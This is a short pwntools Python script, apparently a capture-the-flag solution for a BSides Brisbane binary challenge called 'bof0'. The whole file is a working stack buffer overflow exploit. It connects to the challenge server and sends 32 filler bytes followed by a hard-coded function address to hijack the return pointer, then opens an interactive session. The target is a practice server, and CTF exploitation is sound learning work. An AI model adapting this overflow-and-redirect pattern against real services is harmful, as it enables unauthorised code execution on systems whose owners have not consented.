from pwn import *
#p = process("./bof0")
p = remote("binary.ctf.bsidesbrisbane.com", 9000)
p.recvuntil("?")
callmeaddr = 0x08049287
payload = "A"*32 + p32(callmeaddr)
p.sendline(payload)
p.interactive()
